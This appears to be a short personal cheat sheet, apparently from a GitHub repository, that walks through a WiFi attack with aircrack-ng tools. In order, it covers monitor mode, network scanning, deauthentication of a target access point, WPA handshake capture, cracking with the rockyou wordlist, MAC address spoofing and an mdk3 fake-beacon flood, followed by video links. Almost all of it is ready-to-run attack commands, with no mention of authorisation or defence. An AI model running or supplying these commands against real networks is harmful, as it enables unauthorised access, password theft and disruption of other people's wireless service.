
### prep interface

```airmon-ng check kill```

```sudo airmon-ng start wlan1```

* now our monitor interface will be wlan1mon

----

### scanning BSSID's near-by

AiroDump ALL in channels 1-165 and ignoring negative one.

```airodump-ng -c 1-165 wlan1mon --ignore-negative-one```


Or to filter and display ONLY the BSSID (MAC Address once known), try the below.

```sudo airodump-ng wlan1mon -d xx:xx:xx:xx:xx:xx```

----

### de-auth BSSID 

```aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan1mon```

----

### Capture to file (4 way handshake)

"<i>-c X</i>". This should be the channel of the BSSID we wish to target after "-c".
-w will output the capture to the filename in this example as "wifi-capture".

```airodump-ng -w wifi-capture -c X --bssid xx:xx:xx:xx:xx:xx wlan1mon```

----

### Cracking the handshake capture

The example below uses the capture file example of "wifi-capture" and the ".cap" file.

This then uses aircrack-ng to process the capture file using the "rockyou.txt" wordlist.

*Note there are other wordlists you could use, but the rockyou wordlist is quite popular and good.

```aircrack-ng wifi-capture.cap -w /usr/share/wordlists/rockyou.txt```

----

### MAC changer (if needed)

```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```

See my [mac-changer repo](https://github.com/SystemJargon/mac-changer) for more info.

----

### sporadic-clone-ap

```mdk3 wlan0 b -f ssid_list.txt  -g -a -c 6```

```-c``` being channel, can not specify for mixed results.


----

David Bombal has some videos showing further how this works. Links below.

[Cracking WiFi WPA2 Handshake](https://www.youtube.com/watch?v=WfYxrLaqlN8)

[WiFi WPA/WPA2 vs hashcat and hcxdumptool](https://www.youtube.com/watch?v=Usw0IlGbkC4)

Paul from TallPaulTech (CWNE88) also explains the "4 way handshake" in this [video](https://www.youtube.com/watch?v=vHIRmG_BzQI)
